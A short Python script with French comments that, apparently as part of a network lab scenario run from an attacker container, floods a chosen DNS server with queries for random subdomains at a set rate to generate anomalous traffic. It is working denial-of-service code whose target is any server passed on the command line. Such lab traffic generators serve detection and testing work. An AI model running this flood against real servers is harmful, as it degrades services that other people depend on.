"""Anomalie DNS : envoie des requêtes A pour des noms aléatoires, à débit fixe.

Ce script est exécuté DANS le conteneur h-atk (scenarios.py l'envoie sur
l'entrée standard de « python3 - »), d'où l'absence de dépendance.

Usage : python3 dnsflood.py <serveur> <requêtes/s> <durée en s>
"""

import random
import socket
import struct
import sys
import time


def dns_query(name: str) -> bytes:
    """Requête DNS minimale : en-tête (récursion demandée) + une question de type A."""
    header = struct.pack("!HHHHHH", random.getrandbits(16), 0x0100, 1, 0, 0, 0)
    qname = b"".join(bytes([len(label)]) + label.encode() for label in name.split(".")) + b"\0"
    return header + qname + struct.pack("!HH", 1, 1)


server, rate, duration = sys.argv[1], float(sys.argv[2]), float(sys.argv[3])
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setblocking(False)                      # on n'attend pas les réponses

next_send = start = time.monotonic()
while next_send - start < duration:
    name = f"{random.getrandbits(40):010x}.rt3.lab"
    try:
        sock.sendto(dns_query(name), (server, 53))
    except BlockingIOError:
        pass                                 # tampon plein : requête perdue, on continue
    next_send += 1 / rate
    time.sleep(max(0.0, next_send - time.monotonic()))
